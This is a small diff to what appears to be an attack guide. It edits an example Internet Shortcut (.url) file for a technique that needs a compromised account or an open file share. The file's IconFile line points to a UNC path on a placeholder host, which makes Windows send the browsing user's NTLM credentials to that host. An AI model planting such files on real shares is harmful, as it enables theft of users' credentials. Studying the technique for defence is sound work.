@@ -11,8 +11,8 @@ This attack requires a compromised user account or an open file share, where you
 
 ```html
 [InternetShortcut]
-URL=blah
-WorkingDirectory=blah
+URL=http://google.com
+WorkingDirectory=%username%
 IconFile=\\x.x.x.x\%USERNAME%.icon
 IconIndex=1
 ```
